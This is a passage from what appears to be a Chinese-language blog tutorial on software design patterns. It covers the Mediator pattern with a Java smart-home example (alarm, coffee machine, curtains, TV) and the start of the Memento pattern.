class="hljs-variable">college</span> <span class="hljs-operator">=</span> iterator.next();<br>         System.out.println(<span class="hljs-string">&quot;=== &quot;</span>+college.getName() +<span class="hljs-string">&quot;=====&quot;</span> );<br>         printDepartment(college.createIterator()); <span class="hljs-comment">//得到对应迭代器</span><br>      &#125;<br>   &#125;<br>   <br>   <br>   <span class="hljs-comment">//输出 学院输出 系</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDepartment</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-type">Department</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (Department)iterator.next();<br>         System.out.println(d.getName());<br>      &#125;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通知各个注册的观察者, 看看信息<br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mTemperature: 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mPressure: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*Today mHumidity: 30.3*</span>**</span><br>===百度网站====<br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 气温 : 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 气压: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 湿度: 30.3*</span>**</span><br><br>通知各个注册的观察者, 看看信息<br>===百度网站====<br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 气温 : 10.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 气压: 100.0*</span>**</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*百度网站 湿度: 30.3*</span>**</span><br></code></pre></td></tr></table></figure><h1 id="中介者模式"><a class="markdownIt-Anchor" href="#中介者模式"></a> 中介者模式</h1><p>中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。</p><h2 id="介绍-17"><a class="markdownIt-Anchor" href="#介绍-17"></a> 介绍</h2><p><strong>意图：</strong> 用一个中介对象来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。</p><p><strong>主要解决：</strong><br />对象与对象之间存在大量的关联关系，这样势必会导致系统的结构变得很复杂，同时若一个对象发生改变，我们也需要跟踪与之相关联的对象，同时做出相应的处理。</p><p><strong>何时使用：</strong> 多个类相互耦合，形成了网状结构。</p><p><strong>如何解决：</strong> 将上述网状结构分离为星型结构。</p><p><strong>关键代码：</strong> 对象 Colleague 之间的通信封装到一个类中单独处理。</p><p><strong>应用实例：</strong> 1、中国加入 WTO 之前是各个国家相互贸易，结构复杂，现在是各个国家通过 WTO 来互相贸易。 2、机场调度系统。 3、MVC 框架，其中C（控制器）就是 M（模型）和 V（视图）的中介者。</p><p><strong>优点：</strong> 1、降低了类的复杂度，将一对多转化成了一对一。 2、各个类之间的解耦。 3、符合迪米特原则。</p><p><strong>缺点：</strong> 中介者会庞大，变得复杂难以维护。</p><p><strong>使用场景：</strong> 1、系统中对象之间存在比较复杂的引用关系，导致它们之间的依赖关系结构混乱而且难以复用该对象。2、想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。</p><p><strong>注意事项：</strong> 不应当在职责混乱的时候使用。</p><p><strong>中介者模式的原理类图:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104145432933.png" alt="image-20230104145432933" /></p><p>对原理类图的说明-即(中介者模式的角色及职责)</p><ol><li><p>Mediator 就是抽象中介者,定义了同事对象到中介者对象的接口</p></li><li><p>Colleague 是抽象同事类</p></li><li><p>ConcreteMediator 具体的中介者对象, 实现抽象方法, 他需要知道所有的具体的同事类,即以一个集合来管理HashMap,并接受某个同事对象消息，完成相应的任务</p></li><li><p>ConcreteColleague 具体的同事类，会有很多, 每个同事只知道自己的行为，而不了解其他同事类的行为(方法)，但是他们都依赖中介者对象</p></li></ol><h2 id="实现-15"><a class="markdownIt-Anchor" href="#实现-15"></a> 实现</h2><p>智能家庭项目：</p><ol><li><p>智能家庭包括各种设备，闹钟、咖啡机、电视机、窗帘 等</p></li><li><p>主人要看电视时，各个设备可以协同工作，自动完成看电视的准备工作，比如流程为：闹铃响起-&gt;咖啡机开始做咖啡-&gt;窗帘自动落下-&gt;电视机开始播放</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104145924536.png" alt="" /></p><p><code>Alarm.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-comment">//具体的同事类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Alarm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Alarm</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-comment">//在创建Alarm 同事对象时，将自己放入到ConcreteMediator 对象中[集合]</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendAlarm</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      SendMessage(stateChange);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//调用的中介者对象的getMessage</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ClientTest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientTest</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//创建一个中介者对象</span><br>      <span class="hljs-type">Mediator</span> <span class="hljs-variable">mediator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteMediator</span>();<br>      <br>      <span class="hljs-comment">//创建Alarm 并且加入到  ConcreteMediator 对象的HashMap</span><br>      <span class="hljs-type">Alarm</span> <span class="hljs-variable">alarm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Alarm</span>(mediator, <span class="hljs-string">&quot;alarm&quot;</span>);<br>      <br>      <span class="hljs-comment">//创建了CoffeeMachine 对象，并  且加入到  ConcreteMediator 对象的HashMap</span><br>      <span class="hljs-type">CoffeeMachine</span> <span class="hljs-variable">coffeeMachine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoffeeMachine</span>(mediator,<br>            <span class="hljs-string">&quot;coffeeMachine&quot;</span>);<br>      <br>      <span class="hljs-comment">//创建 Curtains , 并  且加入到  ConcreteMediator 对象的HashMap</span><br>      <span class="hljs-type">Curtains</span> <span class="hljs-variable">curtains</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Curtains</span>(mediator, <span class="hljs-string">&quot;curtains&quot;</span>);<br>      <span class="hljs-type">TV</span> <span class="hljs-variable">tV</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TV</span>(mediator, <span class="hljs-string">&quot;TV&quot;</span>);<br>      <br>      <span class="hljs-comment">//让闹钟发出消息</span><br>      alarm.SendAlarm(<span class="hljs-number">0</span>);<br>      coffeeMachine.FinishCoffee();<br>      alarm.SendAlarm(<span class="hljs-number">1</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CoffeeMachine.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoffeeMachine</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">CoffeeMachine</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StartCoffee</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;It&#x27;s time to startcoffee!&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">FinishCoffee</span><span class="hljs-params">()</span> &#123;<br><br>      System.out.println(<span class="hljs-string">&quot;After 5 minutes!&quot;</span>);<br>      System.out.println(<span class="hljs-string">&quot;Coffee is ok!&quot;</span>);<br>      SendMessage(<span class="hljs-number">0</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Colleague.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-comment">//同事抽象类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Colleague</span> &#123;<br>   <span class="hljs-keyword">private</span> Mediator mediator;<br>   <span class="hljs-keyword">public</span> String name;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Colleague</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br><br>      <span class="hljs-built_in">this</span>.mediator = mediator;<br>      <span class="hljs-built_in">this</span>.name = name;<br><br>   &#125;<br><br>   <span class="hljs-keyword">public</span> Mediator <span class="hljs-title function_">GetMediator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.mediator;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ConcreteMediator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//具体的中介者类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteMediator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Mediator</span> &#123;<br>   <span class="hljs-comment">//集合，放入所有的同事对象</span><br>   <span class="hljs-keyword">private</span> HashMap&lt;String, Colleague&gt; colleagueMap;<br>   <span class="hljs-keyword">private</span> HashMap&lt;String, String&gt; interMap;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteMediator</span><span class="hljs-params">()</span> &#123;<br>      colleagueMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Colleague&gt;();<br>      interMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, String&gt;();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Register</span><span class="hljs-params">(String colleagueName, Colleague colleague)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      colleagueMap.put(colleagueName, colleague);<br><br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>      <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> Alarm) &#123;<br>         interMap.put(<span class="hljs-string">&quot;Alarm&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> CoffeeMachine) &#123;<br>         interMap.put(<span class="hljs-string">&quot;CoffeeMachine&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> TV) &#123;<br>         interMap.put(<span class="hljs-string">&quot;TV&quot;</span>, colleagueName);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleague <span class="hljs-keyword">instanceof</span> Curtains) &#123;<br>         interMap.put(<span class="hljs-string">&quot;Curtains&quot;</span>, colleagueName);<br>      &#125;<br><br>   &#125;<br><br>   <span class="hljs-comment">//具体中介者的核心方法</span><br>   <span class="hljs-comment">//1. 根据得到消息，完成对应任务</span><br>   <span class="hljs-comment">//2. 中介者在这个方法，协调各个具体的同事对象，完成任务</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GetMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange, String colleagueName)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>      <span class="hljs-comment">//处理闹钟发出的消息</span><br>      <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> Alarm) &#123;<br>         <span class="hljs-keyword">if</span> (stateChange == <span class="hljs-number">0</span>) &#123;<br>            ((CoffeeMachine) (colleagueMap.get(interMap<br>                  .get(<span class="hljs-string">&quot;CoffeeMachine&quot;</span>)))).StartCoffee();<br>            ((TV) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;TV&quot;</span>)))).StartTv();<br>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stateChange == <span class="hljs-number">1</span>) &#123;<br>            ((TV) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;TV&quot;</span>)))).StopTv();<br>         &#125;<br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> CoffeeMachine) &#123;<br>         ((Curtains) (colleagueMap.get(interMap.get(<span class="hljs-string">&quot;Curtains&quot;</span>))))<br>               .UpCurtains();<br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> TV) &#123;<span class="hljs-comment">//如果TV发现消息</span><br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (colleagueMap.get(colleagueName) <span class="hljs-keyword">instanceof</span> Curtains) &#123;<br>         <span class="hljs-comment">//如果是以窗帘发出的消息，这里处理...</span><br>      &#125;<br><br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Curtains.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Curtains</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Curtains</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">UpCurtains</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;I am holding Up Curtains!&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Mediator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mediator</span> &#123;<br>   <span class="hljs-comment">//将给中介者对象，加入到集合中</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Register</span><span class="hljs-params">(String colleagueName, Colleague colleague)</span>;<br><br>   <span class="hljs-comment">//接收消息, 具体的同事对象发出</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GetMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange, String colleagueName)</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TV.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.mediator.smarthouse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TV</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Colleague</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TV</span><span class="hljs-params">(Mediator mediator, String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>(mediator, name);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      mediator.Register(name, <span class="hljs-built_in">this</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SendMessage</span><span class="hljs-params">(<span class="hljs-type">int</span> stateChange)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-built_in">this</span>.GetMediator().GetMessage(stateChange, <span class="hljs-built_in">this</span>.name);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StartTv</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;It&#x27;s time to StartTv!&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">StopTv</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;StopTv!&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">It<span class="hljs-symbol">&#x27;s</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> startcoffee!<br>It<span class="hljs-symbol">&#x27;s</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> StartTv!<br><span class="hljs-keyword">After</span> <span class="hljs-number">5</span> minutes!<br>Coffee <span class="hljs-keyword">is</span> ok!<br>I am holding Up Curtains!<br>StopTv!<br></code></pre></td></tr></table></figure><h2 id="中介者模式的注意事项和细节"><a class="markdownIt-Anchor" href="#中介者模式的注意事项和细节"></a> 中介者模式的注意事项和细节</h2><ol><li><p>多个类相互耦合，会形成网状结构, 使用中介者模式将网状结构分离为星型结构，进行解耦</p></li><li><p>减少类间依赖，降低了耦合，符合迪米特原则</p></li><li><p><mark>中介者</mark><strong>承担了较多的责任，一旦中介者出现了问题，整个系统就会受到影响</strong></p></li><li><p>如果设计不当，中介者对象本身变得过于复杂，这点在实际使用时，要特别注意</p></li></ol><h1 id="备忘录模式"><a class="markdownIt-Anchor" href="#备忘录模式"></a> 备忘录模式</h1><p>备忘录模式（Memento Pattern）保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。</p><h2 id="介绍-18"><a class="markdownIt-Anchor" href="#介绍-18"></a> 介绍</h2><p><strong>意图：</strong> 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。</p><p><strong>主要解决：</strong> 所谓备忘录模式就是在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。</p><p><strong>何时使用：</strong><br />很多时候我们总是需要记录一个对象的内部状态，这样做的目的就是为了允许用户取消不确定或者错误的操作，能够恢复到他原先的状态，使得他有&quot;后悔药&quot;可吃。</p><p><strong>如何解决：</strong> 通过一个备忘录类专门存储对象状态。</p><p><strong>关键代码：</strong> 客户不与备忘录类耦合，与备忘录管理类耦合。</p><p><strong>应用实例：</strong> 1、后悔药。 2、打游戏时的存档。 3、Windows 里的 ctrl + z。 4、IE 中的后退。 5、数据库的事务管理。</p><p><strong>优点：</strong> 1、给用户提供了一种可以恢复状态的机制，可以使用户能够比较方便地回到某个历史的状态。2、实现了信息的封装，使得用户不需要关心状态的保存细节。</p><p><strong>缺点：</strong> 消耗资源。如果类的成员变量过多，势必会占用比较大的资源，而且每一次保存都会消耗一定的内存。</p><p><strong>使用场景：</strong> 1、需要保存/恢复数据的相关状态场景。 2、提供一个可回滚的操作。</p><p><strong>注意事项：</strong> 1、为了符合迪米特原则，还要增加一个管理备忘录的类。 2、为了节约内存，可使用原型模式+备忘录模式。</p><p><strong>备忘录模式的原理类图:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104162405505.png" alt="image-20230104162405505" /></p><p>对原理类图的说明-即(备忘录模式的角色及职责)</p><ol><li><p>originator : 对象(需要保存状态的对象)</p></li><li><p>Memento ： 备忘录对象,负责保存好记录，即 Originator 内部状态</p></li><li><p>Caretaker: 守护者对象,负责保存多个备忘录对象， 使用集合管理，提高效率</p></li><li><p>说明：如果希望保存多个 originator 对象的不同时间的状态，也可以，只需要要 HashMap &lt;String, 